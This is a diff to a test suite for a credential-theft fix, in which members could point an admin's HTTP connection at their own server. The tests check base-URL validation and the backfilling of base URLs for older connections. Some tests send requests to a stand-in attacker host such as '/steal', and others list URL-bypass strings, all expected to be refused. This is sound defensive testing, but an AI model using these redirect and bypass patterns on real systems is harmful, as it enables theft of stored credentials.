@@ -9,6 +9,7 @@ import { connectTestDb } from './helpers/db';
 import { connections } from '../src/db/schema';
 import { seal } from '../src/common/secretbox';
 import { httpBaseUrlProblem, urlWithinBase } from '../src/connections/providers';
+import { ConnectionsService } from '../src/connections/connections.service';
 
 /**
  * #1035 — a member could steal an admin's HTTP-connection credential: members see connection ids, any member can author an
@@ -128,7 +129,7 @@ describe('#1035 the attack: a member points an admin connection at their own ser
 
     const refused = await memberSendsTest(row!.id, `${legitUrl}/v1/x`);
     expect(refused.statusCode).toBe(422);
-    expect(refused.body).toContain('no allowed base URL');
+    expect(refused.body).toContain("Set this connection's base URL");
     expect(legitSaw).toEqual([]);
 
     expect((await as(member.token, 'PATCH', `/workspaces/${ws}/connections/${row!.id}`, { base_url: `${legitUrl}/v1` })).statusCode, 'only an admin sets it').toBe(403);
@@ -158,5 +159,68 @@ describe('#1035 base URL validation', () => {
     expect(urlWithinBase('https://api.example.com/v1/a/b?x=1#h', 'https://api.example.com/v1')).toBe(true);
     expect(urlWithinBase('https://api.example.com/anything', 'https://api.example.com')).toBe(true);
     for (const out of ['https://api.example.com/v10', 'https://api.example.com/v1/../x', 'https://API.example.com.evil/v1', 'http://api.example.com/v1', 'https://api.example.com:444/v1', 'https://x@api.example.com/v1', 'nope']) expect(urlWithinBase(out, 'https://api.example.com/v1'), out).toBe(false);
+  });
+});
+
+
+/**
+ * Otto's ruling on #1035: breaking every existing connection silently is not acceptable. A connection made before base_url existed
+ * gets it from where its OWN rules already send it, but only when that is unambiguous; the rest are flagged and their runs fail loudly.
+ */
+describe('#1035 existing connections: backfilled when unambiguous, otherwise flagged', () => {
+  const legacy = async (name: string, withBase?: string) => {
+    const auth = { auth_style: 'bearer', token: SECRET, ...(withBase ? { base_url: withBase } : {}) };
+    const [row] = await db.insert(connections).values({ workspaceId: ws, provider: 'http', name, authSealed: seal(JSON.stringify(auth)), scopes: [], status: 'active', lastOkAt: new Date() }).returning();
+    return row!.id;
+  };
+  const ruleUsing = async (connectionId: string, url: string) => {
+    const res = await as(admin.token, 'POST', `/workspaces/${ws}/databases/${dbId}/automations`, { name: `rule-${Math.random()}`, trigger: { type: 'record_created' }, actions: [{ type: 'http_request', method: 'GET', url, connection_id: connectionId }] });
+    expect(res.statusCode, res.body).toBeLessThan(300);
+  };
+  const summary = async (id: string) => ((await as(admin.token, 'GET', `/workspaces/${ws}/connections`)).json().data as Array<{ id: string; base_url?: string | null; needs_base_url?: boolean }>).find((c) => c.id === id)!;
+  const run = () => app.get(ConnectionsService).backfillHttpBaseUrls();
+
+  it('one origin across all the rules that use it: the base URL becomes that origin, and the connection then works', async () => {
+    const id = await legacy('One origin');
+    await ruleUsing(id, `${legitUrl}/v1/orders`);
+    await ruleUsing(id, `${legitUrl}/v2/customers?x=1`);
+    await run();
+    expect(await summary(id)).toMatchObject({ base_url: legitUrl, needs_base_url: false });
+    expect((await memberSendsTest(id, `${legitUrl}/v1/orders`)).statusCode).toBeLessThan(300);
+    expect((await memberSendsTest(id, `${attackerUrl}/steal`)).statusCode, 'and the attacker is still refused').toBe(422);
+  });
+
+  it('rules pointing at SEVERAL origins, a templated host, or none at all: left without one and flagged, never guessed', async () => {
+    const two = await legacy('Two origins');
+    await ruleUsing(two, `${legitUrl}/v1/a`);
+    await ruleUsing(two, `${attackerUrl}/b`);
+    const templated = await legacy('Templated host');
+    await ruleUsing(templated, 'https://{Name}.example.com/x');
+    const unused = await legacy('Unused');
+    const result = await run();
+    expect(result.ambiguous).toBeGreaterThanOrEqual(2);
+    expect(result.unused).toBeGreaterThanOrEqual(1);
+    for (const id of [two, templated, unused]) expect(await summary(id), id).toMatchObject({ base_url: null, needs_base_url: true });
+  });
+
+  it('a connection that already has a base URL is never overwritten, and a second run changes nothing (idempotent)', async () => {
+    const id = await legacy('Has one', 'https://chosen.example.com/api');
+    await ruleUsing(id, `${legitUrl}/v1/x`);
+    await run();
+    expect(await summary(id)).toMatchObject({ base_url: 'https://chosen.example.com/api' });
+    const again = await run();
+    expect(again.set, 'nothing left to backfill').toBe(0);
+  });
+
+  it('a connection used only in ANOTHER workspace\'s rules is not given that workspace\'s origin', async () => {
+    const id = await legacy('Other workspace rule');
+    const other = (await as(admin.token, 'POST', '/workspaces', { name: 'Elsewhere' })).json().id as string;
+    const space = (await as(admin.token, 'GET', `/workspaces/${other}/spaces`)).json()[0].id;
+    const otherDb = (await as(admin.token, 'POST', `/workspaces/${other}/databases`, { space_id: space, name: 'Elsewhere DB' })).json().id as string;
+    // a rule over there can't even reference this connection (validated per workspace), so write it the way old data could be: directly
+    const { automations } = await import('../src/db/schema');
+    await db.insert(automations).values({ databaseId: otherDb, name: 'foreign', trigger: { type: 'record_created' }, actions: [{ type: 'http_request', method: 'GET', url: `${attackerUrl}/x`, connection_id: id }] as never });
+    await run();
+    expect(await summary(id), 'rules in another workspace say nothing about this connection').toMatchObject({ base_url: null, needs_base_url: true });
   });
 });
